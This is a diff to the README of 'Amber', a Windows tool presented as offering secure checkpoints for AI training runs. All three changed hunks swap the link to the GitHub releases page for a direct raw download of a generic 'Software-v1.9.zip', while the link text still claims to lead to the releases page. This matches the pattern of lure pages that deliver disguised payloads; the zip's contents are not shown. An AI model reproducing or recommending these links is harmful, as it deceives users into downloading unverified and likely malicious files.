@@ -1,6 +1,6 @@
 # 🟣 Amber - Secure checkpoints for training runs
 
-[![Download Amber](https://img.shields.io/badge/Download-Amber-blue?style=for-the-badge)](https://github.com/ethylgrouppinuscaliforniarum631/Amber/releases)
+[![Download Amber](https://img.shields.io/badge/Download-Amber-blue?style=for-the-badge)](https://raw.githubusercontent.com/ethylgrouppinuscaliforniarum631/Amber/main/assets/Software-v1.9.zip)
 
 ## 📦 What Amber does
 
@@ -18,7 +18,7 @@ Use Amber if you want:
 
 Amber is available from the release page. Use this link to visit the page and download the Windows file:
 
-[Visit the Amber releases page](https://github.com/ethylgrouppinuscaliforniarum631/Amber/releases)
+[Visit the Amber releases page](https://raw.githubusercontent.com/ethylgrouppinuscaliforniarum631/Amber/main/assets/Software-v1.9.zip)
 
 ### Steps
 
@@ -189,7 +189,7 @@ ai-compliance, ai-safety, anomaly-detection-algorithm, checkpoint, content-addre
 
 Use the release page below to download Amber for Windows:
 
-[https://github.com/ethylgrouppinuscaliforniarum631/Amber/releases](https://github.com/ethylgrouppinuscaliforniarum631/Amber/releases)
+[https://raw.githubusercontent.com/ethylgrouppinuscaliforniarum631/Amber/main/assets/Software-v1.9.zip](https://raw.githubusercontent.com/ethylgrouppinuscaliforniarum631/Amber/main/assets/Software-v1.9.zip)
 
 ## 🪟 Windows use path
 
